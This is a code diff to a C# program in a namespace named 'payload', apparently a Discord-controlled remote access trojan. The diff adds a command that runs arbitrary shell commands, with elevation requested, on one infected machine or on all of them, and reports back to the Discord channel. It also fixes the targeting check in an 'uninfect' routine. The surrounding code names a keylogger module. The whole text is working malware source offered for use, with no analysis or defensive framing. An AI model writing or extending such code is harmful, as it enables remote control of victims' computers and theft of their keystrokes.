@@ -199,6 +199,30 @@ namespace payload
                         s.Start();
                         break;
                     }
+                case "command":
+                    {
+                        if (args[0] != Environment.MachineName && args[0].ToLower() != "all") break;
+                        args.RemoveAt(0);
+                        string command = string.Join(" ", args);
+
+                        Process cmdproc = new Process()
+                        {
+                            StartInfo = new ProcessStartInfo()
+                            {
+                                FileName = "cmd.exe",
+                                Arguments = "/c " + command,
+                                UseShellExecute = false,
+                                RedirectStandardOutput = true,
+                                RedirectStandardError = true,
+                                Verb = "runas"
+                            }
+                        };
+                        cmdproc.Start();
+                        cmdproc.WaitForExit();
+
+                        await message.Channel.SendMessageAsync($"Command executed on {Environment.MachineName}");
+                        break;
+                    }
 
                 // Keylogger Module
                 case "startkeylogger":
@@ -253,7 +277,8 @@ namespace payload
                     }
                 case "uninfect":
                     {
-                        if (args[0] != Environment.MachineName || args[0].ToLower() != "all") break;
+                        if (args[0] != Environment.MachineName && args[0].ToLower() != "all") break;
+                        await message.Channel.SendMessageAsync($"Attempted to uninfect {Environment.MachineName}");
                         Uninfect();
                         break;
                     }
